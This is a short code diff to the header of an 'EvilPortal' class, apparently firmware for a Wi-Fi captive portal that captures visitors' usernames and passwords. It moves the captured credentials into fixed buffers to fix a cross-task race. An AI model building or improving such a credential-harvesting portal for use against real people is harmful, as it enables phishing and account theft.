@@ -88,11 +88,15 @@ class EvilPortal {
 
   private:
     bool runServer;
-    bool name_received;
-    bool password_received;
+    // Captured creds are written by the /get web handler (AsyncTCP task) and read by the
+    // main task -> fixed char buffers (not Arduino String) + a spinlock (cred_mux, in the
+    // .cpp) so a concurrent read can never observe a String mid-realloc (cross-task UAF).
+    volatile bool name_received;
+    volatile bool password_received;
 
-    String user_name;
-    String password;
+    static const uint8_t MAX_CRED_SIZE = 64;
+    char user_name[MAX_CRED_SIZE] = {0};
+    char password[MAX_CRED_SIZE] = {0};
 
     bool has_html;
 
